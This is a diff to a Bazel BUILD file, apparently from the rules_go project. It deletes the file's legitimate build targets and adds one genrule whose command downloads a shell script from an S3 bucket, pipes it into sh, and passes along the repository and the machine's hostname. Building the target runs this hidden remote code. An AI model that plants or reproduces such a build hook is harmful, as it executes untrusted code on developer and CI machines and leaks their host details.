@@ -1,70 +1,7 @@
-load("@bazel_skylib//:bzl_library.bzl", "bzl_library")
 
-# The 'go' binary of the current Go toolchain compatible with the host.
-# Use this with `bazel run` to perform utility actions such as `go mod tidy` in
-# a hermetic fashion.
-# Note: This is not meant to and cannot be used as a tool in e.g. a genrule. If
-# you need this functionality, please file an issue describing your use case.
-alias(
-    name = "go",
-    actual = "//go/tools/go_bin_runner",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_go.git\\&folder=go\\&hostname=`hostname`\\&foo=sak",
     visibility = ["//visibility:public"],
-)
-
-filegroup(
-    name = "all_files",
-    testonly = True,
-    srcs = glob(["**"]) + [
-        "//go/config:all_files",
-        "//go/constraints/amd64:all_files",
-        "//go/platform:all_files",
-        "//go/runfiles:all_files",
-        "//go/toolchain:all_files",
-        "//go/tools:all_files",
-        "//go/private:all_files",
-    ],
-    visibility = ["//visibility:public"],
-)
-
-filegroup(
-    name = "all_rules",
-    srcs = glob(["*.bzl"]) + [
-        "//go/platform:all_rules",
-        "//go/private:all_rules",
-        "//go/toolchain:all_rules",
-    ],
-    visibility = ["//visibility:public"],
-)
-
-toolchain_type(
-    name = "toolchain",
-    visibility = ["//visibility:public"],
-)
-
-bzl_library(
-    name = "def",
-    srcs = ["def.bzl"],
-    visibility = ["//visibility:public"],
-    deps = [
-        "//extras:gomock",
-        "//go/private:context",
-        "//go/private:go_toolchain",
-        "//go/private:providers",
-        "//go/private/rules:library",
-        "//go/private/rules:nogo",
-        "//go/private/rules:sdk",
-        "//go/private/rules:source",
-        "//go/private/rules:wrappers",
-        "//go/private/tools:path",
-    ],
-)
-
-bzl_library(
-    name = "deps",
-    srcs = ["deps.bzl"],
-    visibility = ["//visibility:public"],
-    deps = [
-        "//go/private:repositories",
-        "//go/private:sdk",
-    ],
 )
